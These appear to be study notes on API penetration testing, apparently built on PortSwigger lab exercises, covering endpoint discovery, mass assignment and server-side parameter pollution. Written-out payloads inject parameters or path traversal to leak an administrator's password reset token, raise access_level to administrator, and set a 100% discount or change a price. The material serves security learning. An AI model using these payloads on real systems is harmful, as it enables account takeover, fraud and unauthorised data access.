![[API Testing.png]]
# Recon

First, find out as much information about the API as possible, to discover its attack surface. Start by identifying API endpoints - locations where an API receives requests about a specific resource on its server.

As an example:

```html
GET /api/books HTTP/1.1
Host: example.com
```

Once endpoints are identified, determine how to interact with them which can enable you to construct valid HTTP requests to test the API:

- The input data the API processes, including both compulsory and optional parameters
- The types of requests the API accepts, including supported HTTP methods and media formats
- Rate limits and authentication mechanisms
# API Documentation

Even if API documentation is not openly available, you may be able to access it by browsing applications that use the API. Look for endpoints that may refer to API documentation, such as:

- /api
- /swagger/index.html
- /openapi.json

If you identify an endpoint for a resource, make sure to investigate the base path:

- /api/swagger/v1/users/123
- /api/swagger/v1
- /api/swagger
- /api

>[!info]
>Burp Scanner can crawl and audit OpenAPI documentation, or other documentation in JSON or YAML format. 
# Exploiting an API endpoint using documentation

Using all functionality of the application may uncover an API endpoint when updating certain details (i.e. email address):

- `/api/user/wiener`

Try requesting the base API path to disclose the API functionality in the response:

- `/api/`

You can potentially use the API to delete or modify other users:

- `DELETE /api/user/carlos`
# Identifying API Endpoints

Review any JavaScript files as these can disclose API functionality. Look for any suggested API endpoints such as `/api`. Try changing the HTTP method and media type (Content-Type header/request body) when requesting the API to determine what is accepted and each endpoint.

When interacting with API endpoints, review error messages and other responses - sometimes they can include information you can use to construct a valid HTTP request.

An API endpoint may support different HTTP methods - test all potential methods when investigating API endpoints. It may enable you to identify additional endpoint functionality, opening up more attack surface.

As an example, the endpoint /api/tasks may support the following:

- GET /api/tasks - retrieves a list of tasks
- POST /api/tasks - creates a new task
- DELETE /api/tasks/1 - deletes a task

>[!warning] 
>When testing different methods, target low-priority objects to avoid unintended consequences like altering critical items or creating excessive records.

Changing the media type for requests can disclose various things including:

- Trigger errors that disclose useful information
- Bypass flawed defences
- Take advantage of differences in processing logic. An API may be secure when handling JSON data but susceptible to injection attacks when dealing with XML.

Use Intruder to find hidden API endpoints by fuzzing the last resource:

- /api/user/update
# Find & Exploit Unused API Endpoint

Use all of the application's functionality that is available. As an example, when selecting an item to place in the shopping cart on an e-commerce site, an API endpoint may be discovered:

- /api/products/1/price

The request can be sent to Repeater and the HTTP method can be tested to identify which ones are accepted. An example is the PATCH method which may be used. Additionally, test the various media types that it accepts (eg. application/json).

The price may be able to be changed after identifying these:

```json
PATCH /api/products/1/price HTTP/2
Content-Type: application/json
Content-Length: 11
REDACTED...

{
	"price":5
}
```
# Finding Hidden Parameters

There are numerous tools to help identify hidden parameters. Intruder allows you to automatically discover hidden parameters using a wordlist of common parameter names to replace existing parameters or add new parameters. 

Consider an API for updating user information:

- `PUT /api/user/update`

Try fuzzing update to other functions like `delete` or `add`.

Param Miner allows you to guess up to 65,536 parameter names per request. It automatically guesses names that are relevant to the application, based on information taken from the scope. 

The Content discovery tool enables you to discover content that is not linked from visible content that you can browse to, including parameters.
# Mass Assignment

Since mass assignment creates parameters from object fields, you can identify them by manually examining objects returned by the API. For example, a PATCH /api/users request which enables users to update their username and email may include the following JSON:

```json
{
    "username": "wiener",
    "email": "wiener@example.com",
}
```

A concurrent GET /api/users/123 request returns the following:

```json
{
    "id": 123,
    "name": "John Doe",
    "email": "john@example.com",
    "isAdmin": "false"
}
```

This can indicate that the hidden ID and isAdmin parameters are bound to the internal user object, alongside the updated username and email parameters. Try including additional fields in the PATCH method or the state-changing methods which are available and identify how the app responds.

Use all the functionality to popular Burp's HTTP history for review. Afterwards, you may notice a request such as GET /api/checkout which returns the following information in response:

```json
{
  "chosen_discount": {
    "percentage": 0
  },
  "chosen_products": [
    {
      "product_id": "1",
      "name": "Lightweight \"l33t\" Leather Jacket",
      "quantity": 1,
      "item_price": 133700
    }
  ]
}
```

Or a POST request to /api/checkout which contains the request body:

```json
{
  "chosen_products": [
    {
      "product_id": "1",
      "quantity": 1
    }
  ]
}
```

Above, you could submit the following using the POST request to purchase the item for free:

```json
{
  "chosen_discount": {
    "percentage": 100
  },
  "chosen_products": [
    {
      "product_id": "1",
      "quantity": 1
    }
  ]
}
```
# Server-Side Parameter Pollution

Some systems contains internal APIs that are not directly accessible from the internet. Server-side parameter pollution occurs when a website embeds user input in a server-side request to an internal API without adequate encoding. This means an attacker may be able to manipulate or inject parameters which may enabled them to:

- Override existing parameters
- Modify the app behaviour
- Access unauthorized data

>[!info]
>You can test any user input for any kind of parameter pollution. For example, query parameters, form fields, headers, URL path parameters.
# Testing for Server-Side Parameter Pollution in query string

To test for it, place query syntax characters like `#`, `&` and "=" in the input and observe how the application responds. You can also use a URL encoded "#" character to attempt to truncate the server side request:

```html
GET /userSearch?name=peter%23foo&back=/home
```

The front end may try to access the following:

```html
GET /users/search?name=peter#foo&publicProfile=true
```

Review the response for clues about whether the query has been truncated. For example, if the response returns the user peter, the server-side query may have been truncated. If an Invalid name error message is returned, the app may have treated foot as part of the username, suggesting the server-side request may not have been truncated.

If you are able to truncate the server-side request, this removes the requirement for the publicProfile to be set to true meaning you might be able to exploit it to return non-public user profiles.
# Exploiting Server-side parameter pollution in query string

Try to submit fuzzing payloads to identify application behaviour. As an example, the following payload may returned a "Parameter is not supported" message which indicates that the injected parameter was processed by the backend API:

```html
csrf=VlaNiS8DCwtHUAzh7m5tsBzmxx5lWd4T&username=administrator%26id=test
```

The payload below may return a "Field not specified" message:

```html
csrf=VlaNiS8DCwtHUAzh7m5tsBzmxx5lWd4T&username=administrator%23test
```

The payload below may return the email for the provided username:

```html
csrf=VlaNiS8DCwtHUAzh7m5tsBzmxx5lWd4T&username=administrator%26field=email%23
```

The payload below may allow you to get the reset_token value for the administrator user. The parameter name (reset_token) could have been found by reading through a JavaScript file exposed in the application:

```html
csrf=VlaNiS8DCwtHUAzh7m5tsBzmxx5lWd4T&username=administrator%26field=reset_token%23
```

The request below could be submitted to successfully reset the password for the admin user:

```html
GET /forgot-password?reset_token=TOKEN-VALUE HTTP/2
```
# Server-side parameter pollution in REST paths

As an example, there is an app that can make you edit user profiles based on their username. Requests may be sent to the following endpoint:

```html
GET /edit_profile.php?name=peter
```

This can result in the following server-side request:

```html
GET /api/private/users/peter
```

An attacker might be able to manipulate server-side URL path parameters to exploit the API. To test for it, add path traversal sequences to modify parameters and observe how the app responds.

You can submit URL-encoded creds (peter/../admin) as the value of the name parameter:

```html
GET /edit_profile.php?name=peter%2f..%2fadmin
```

Which may result in the following server-side request:

```html
GET /api/private/users/peter/../admin
```
# Exploiting server-side parameter pollution in a REST URL

As an example, the following request is vulnerable to parameter pollution:

```html
POST /forgot-password HTTP/2
REDACTED...

csrf=63i3nSUwifBDmAYAnYtmxk2TP6EMFT8V&username=administrator
```

To identify the vulnerability and exploit it, the following could be done to potentially gain access to the admin account. For example, the payload returned a different response than the previous requests:

```html
csrf=63i3nSUwifBDmAYAnYtmxk2TP6EMFT8V&username=administrator/../../../../../
```

The following still returns the normal response, indicating that the app is processing the path traversal inputs:

```html
csrf=63i3nSUwifBDmAYAnYtmxk2TP6EMFT8V&username=administrator/../administrator
```

The following payload returns a verbose error message that discloses the structure of the internal API:

```bash
csrf=NpAyxU8sqRJrZ5KvnR0WzVLBYTnV3Kt8&username=../../../../openapi.json%23
```

The decoded version is:

```bash
csrf=63i3nSUwifBDmAYAnYtmxk2TP6EMFT8V&username=administrator/../../../../../openapi.json#
```

The following payload will return the "password reset token" for the admin user. The variable name (passwordResetToken) was found in a JavaScript file:

```bash
csrf=NpAyxU8sqRJrZ5KvnR0WzVLBYTnV3Kt8&username=../../../../api/internal/v1/users/administrator/field/passwordResetToken%23
```

# Testing for server-side parameter pollution in structured data formats

Consider an app that enables you to edit a profile and apply changes with a request to server-side API. When editing the name, the browser makes a request:

```html
POST /myaccount
name=peter
```

Resulting in:

```json
PATCH /user/7312/update
{"name":"peter"}
```

If you attempt to add the "access_level" parameter to the request as follows, and user input is added to the server-side JSON data without validation or sanitization, it can result in the following:

```html
POST /myaccount
name=peter","access_level":"administrator
```

```json
PATCH /users/7312/update
{name="peter","access_level":"administrator"}
```

A similiar example may be where the client-side user input is in JSON data. When editing the name, it makes:

```html
POST /myaccount
{"name": "peter"}
```

Resulting in:

```bash
PATCH /users/7312/update
{"name":"peter"}
```

Attempting to add the access_level parameter to the request results in:

```bash
POST /myaccount
{"name": "peter\",\"access_level\":\"administrator"}
```

If the user input is decoded, then added to the server-side JSON data without adequate encoding, it results in:

```bash
PATCH /users/7312/update
{"name":"peter","access_level":"administrator"}
```

Review the examples in this section - [https://portswigger.net/web-security/api-testing/server-side-parameter-pollution#testing-for-server-side-parameter-pollution-in-structured-data-formats](https://portswigger.net/web-security/api-testing/server-side-parameter-pollution#testing-for-server-side-parameter-pollution-in-structured-data-formats)
# Testing with Automated Tools

Burp Scanner automatically detects suspicious input transformation when performing an audit. You can also use the Backslash Powered Scanner plugin to identify server-side injection vulnerabilities. The scanner classifies inputs as boring, interesting, or vulnerable.

